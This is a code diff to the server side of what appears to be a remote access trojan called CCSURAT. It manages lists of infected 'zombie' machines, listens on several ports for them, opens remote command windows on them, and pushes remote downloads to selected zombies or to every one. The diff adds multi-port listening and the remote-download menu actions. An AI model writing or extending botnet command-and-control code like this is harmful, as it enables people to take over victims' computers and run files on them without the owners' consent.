@@ -13,6 +13,7 @@ namespace CCSURAT_Server
         private static int listenPort = 7777;
 
         private Listener listener;
+        private List<Listener> listeners;
 
         // Store active connection in a list
         public List<Zombie> zombies = new List<Zombie>();
@@ -22,18 +23,33 @@ namespace CCSURAT_Server
         public ServerMainForm()
         {
             InitializeComponent();
+            listeners = new List<Listener>();
         }
 
         private void Form1_Load(object sender, EventArgs e)
         {
             // start the connection listener on port, pass current zombies list
-            listener = new Listener(this, zombies, listenPort);
-            Thread thread = new Thread(new ThreadStart(listener.Listen));
-            thread.Start();
+            ListenOnPort(listenPort);
             this.Text = "CCSURAT-Server v" + Application.ProductVersion;
 
             zombieListView.ControlRemoved += new System.Windows.Forms.ControlEventHandler(this.zombieListView_ControlRemoved);
             //this.ControlAdded += new System.Windows.Forms.ControlEventHandler(this.Control_Added);
+        }
+
+        // Create a new listener on specified port.
+        private void ListenOnPort(int port)
+        {
+            Listener listener = new Listener(this, zombies, port);
+            listeners.Add(listener);
+            Thread thread = new Thread(new ThreadStart(listener.Listen));
+            thread.Start();
+
+            // update port list status
+            portListTextbox.Text = "Listening on port(s): ";
+            foreach (Listener l in listeners)
+                portListTextbox.Text += l.port + ", ";
+            portListTextbox.Text = portListTextbox.Text.Substring(0, portListTextbox.Text.Length - 2);
+
         }
 
         private void sendButton_Click(object sender, EventArgs e)
@@ -172,6 +188,43 @@ namespace CCSURAT_Server
                         remoteCMD.Show();
                     }
                 }
+        }
+
+        // Create new listener on input port.
+        private void listenOnPortToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            InputBox input = new InputBox();
+            ListenOnPort(Convert.ToInt32(input.Show("Port selection", "Listen on port: ", "", "OK")));
+        }
+
+        private void remoteDownloadToolStripMenuItem1_Click(object sender, EventArgs e)
+        {
+            if (selected.Item != null)
+                foreach (ZombieListItem zItem in zombieListView.SelectedItems)
+                {
+                    if (zItem.ForeColor != Color.Gray)
+                    {
+                        RemoteDownloader remoteDownloader = new RemoteDownloader(zItem.zombieClient);
+                        remoteDownloader.Show();
+                    }
+                }
+        }
+
+        private void remoteDownloadToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            RemoteDownloader remoteDownloader = new RemoteDownloader(zombies);
+            remoteDownloader.Show();
+        }
+
+        // Handle Ctrl+A (Select all)
+        private void zombieListView_KeyDown(object sender, KeyEventArgs e)
+        {
+            if (e.KeyCode == Keys.A && e.Control)
+            {
+                zombieListView.MultiSelect = true;
+                foreach (ListViewItem item in zombieListView.Items)
+                    item.Selected = true;
+            }
         }
     }
 
